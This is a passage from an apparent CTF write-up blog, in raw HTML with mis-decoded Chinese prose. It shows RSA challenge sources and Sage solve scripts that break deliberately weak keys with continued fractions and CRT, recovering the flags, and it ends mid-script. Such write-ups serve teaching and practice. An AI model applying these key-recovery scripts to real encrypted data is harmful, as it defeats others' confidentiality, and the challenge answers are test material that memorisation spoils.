style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Ï†(n_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>äº†</p><p>crtæ±‚è§£å‡ºæ¥çš„æ˜¯æ»¡è¶³è§£çš„æœ€å°å€¼ï¼Œæ˜¾ç„¶ä¸ç¬¦åˆè¦æ±‚</p><p>æ‰€æœ‰æˆ‘ä»¬éœ€è¦å¯¹å…¶åŠ ä¸Šxä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo>âˆ—</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><msub><mi>r</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e*r_3)/gcd(e,r_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><h2 id="exp-6"><a class="markdownIt-Anchor" href="#exp-6"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">a,b,c,d,e=2**255,2**256</span><br><span class="hljs-string">g=ab+1</span><br><span class="hljs-string">j=ac+1</span><br><span class="hljs-string">t=cd+1</span><br><span class="hljs-string"></span><br><span class="hljs-string">phi=(g-1)(t-1)</span><br><span class="hljs-string">o=((ed-1)//phi)*b+1=kb+1</span><br><span class="hljs-string"></span><br><span class="hljs-string">n1=gt</span><br><span class="hljs-string">n2=jo</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">77493305850606946966866586869701562747566137421194857276849326558383863716599</span><br>n1 = <span class="hljs-number">38214712801044280452242029022307023900010505700133304226967361821658293768459754887223522190673421124166486124464596635967747405359806642464884601455285823454970604600165907209542618963333642882524596571019916658676095313436156240684679902251615046617153094607425987125749225956361360222801251450373042579071</span><br>n2 = <span class="hljs-number">11918534754165556595562303500191427316052163288557481525821438608864207524482981704928088272082867228651327063972728644192877335261376841505970220897803876176646736511250339814035116162036800063521023303060582016775080988747746487028664050144843952770605999675734459531886474293242344088869877433555271258269</span><br>enc1 = <span class="hljs-number">15808757304442558489652709164051631267713593320560967145595438513675108079906680505924179038743563463272753097766933667737349956243897214853643343110837736923623483907392474855188388096345292952323482631367759757699216716624973244377786699291503949070419765404840454938181818882998235566160193218211345167102</span><br>enc2 = <span class="hljs-number">6376686158682997059741103218078544724010800198504747162290763103690338182777916072489234933936183210135919268370502287963945937266836059808775864844630371956704383598114953698187649635431791980376016420776898290168916806683089572655387949425292390749405301644222442142567586889975355029412203353803624681004</span><br><br>cf = continued_fraction(n2 / n1)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    k,r3=pkd.as_integer_ratio()<br>    <span class="hljs-keyword">if</span> gcd(k, e) != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    r = inverse_mod(-k, e)<br>    phi = crt([r, <span class="hljs-number">0</span>], [e, r3])<br>    md = e*r3 // gcd(e, r3)<br>    st = phi + (n1//md) * md <span class="hljs-comment">#é¢„å¤„ç†ä¸€ä¸‹</span><br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">if</span> gcd(e, st+i*md) != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        d = inverse_mod(e, st + i*md)<br>        m = long_to_bytes(power_mod(enc1, d, n1))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(phi)<br>            <span class="hljs-built_in">print</span>(m)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;flag&#123;C0ngra4u1ation!!!_You_R3a1ly_Kn0w_Lat2ic3&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;C0ngra4u1ation!!!_You_R3a1ly_Kn0w_Lat2ic3&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ¹–æ¹˜æ¯-2021signin"><a class="markdownIt-Anchor" href="#æ¹–æ¹˜æ¯-2021signin"></a> [æ¹–æ¹˜æ¯ 2021]signin</h1><h2 id="é¢˜ç›®-7"><a class="markdownIt-Anchor" href="#é¢˜ç›®-7"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> random<br><br>m1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">2</span>])<br>m2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">2</span>:])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">pbits, qbits</span>):<br>    p1, q1 = getPrime(pbits), getPrime(qbits)<br>    n1 = p1**<span class="hljs-number">4</span>*q1<br>    q2 = getPrime(qbits)<br>    bound = p1 // (<span class="hljs-number">8</span>*q1*q2) + <span class="hljs-number">1</span><br>    p2 = random.randrange(p1, p1 + bound)<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p2):<br>        p2 = random.randrange(p1, p1 + bound)<br>    n2 = p2**<span class="hljs-number">4</span>*q2<br>    <span class="hljs-keyword">return</span> (n1, n2), (p1, q1), (p2, q2)<br><br>e = <span class="hljs-number">0x10001</span><br>pbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">360</span>)<br>qbits = <span class="hljs-built_in">int</span>(<span class="hljs-number">128</span>)<br>pk, sk1, sk2 = gen(pbits, qbits)<br>c1 = <span class="hljs-built_in">pow</span>(m1, e, pk[<span class="hljs-number">0</span>])<br>c2 = <span class="hljs-built_in">pow</span>(m2, e, pk[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;pk = <span class="hljs-subst">&#123;pk&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c1, c2 = <span class="hljs-subst">&#123;c1, c2&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">pk = (1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233, 1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989)</span><br><span class="hljs-string">c1, c2 = (361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438, 33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-7"><a class="markdownIt-Anchor" href="#åˆ†æ-7"></a> åˆ†æ</h2><blockquote><p>è¿åˆ†æ•°åŸç†ä¸å¤ªæ‡‚â€˜</p><p>xennyå¸ˆå‚…è¯´çœ‹åˆ°è¿™ç§å¤šå› å­+å¤§æ•°éƒ½å¯ä»¥è€ƒè™‘è¿åˆ†æ•°åˆ†è§£</p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><mn>4</mn></msubsup><mo>âˆ—</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">n_1=p_1^4*q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>2</mn></msub><mo>=</mo><msubsup><mi>p</mi><mn>2</mn><mn>4</mn></msubsup><mo>âˆ—</mo><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_2=p_2^4*q_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">p_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ç•¥å¤§äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">p_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>æœ‰ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><msub><mi>n</mi><mn>1</mn></msub><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>â‰ˆ</mo><mfrac><mrow><msubsup><mi>p</mi><mn>1</mn><mn>4</mn></msubsup><mo>âˆ—</mo><msub><mi>q</mi><mn>1</mn></msub></mrow><mrow><msubsup><mi>p</mi><mn>2</mn><mn>4</mn></msubsup><mo>âˆ—</mo><msub><mi>q</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{n_1}{n_2}â‰ˆ\frac{p_1^4*q_1}{p_2^4*q_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.443416em;vertical-align:-0.9523079999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4911079999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9523079999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>åˆ©ç”¨è¿åˆ†æ•°å¯ä»¥æ±‚è§£<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mn>1</mn><mtext>å’Œ</mtext><msub><mi>q</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">q1å’Œq_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mord cjk_fallback">å’Œ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h2 id="exp-7"><a class="markdownIt-Anchor" href="#exp-7"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>pk = (<span class="hljs-number">1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233</span>, <span class="hljs-number">1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989</span>)<br>c1, c2 = (<span class="hljs-number">361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438</span>, <span class="hljs-number">33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394</span>)<br>e = <span class="hljs-number">0x10001</span><br>n1=pk[<span class="hljs-number">0</span>]<br>n2=pk[<span class="hljs-number">1</span>]<br>cf = continued_fraction(n1 / n2)<br>convers = cf.convergents()<br><span class="hljs-keyword">for</span> pkd <span class="hljs-keyword">in</span> convers:<br>    q1,q2=pkd.as_integer_ratio()<br>    <span class="hljs-keyword">if</span> 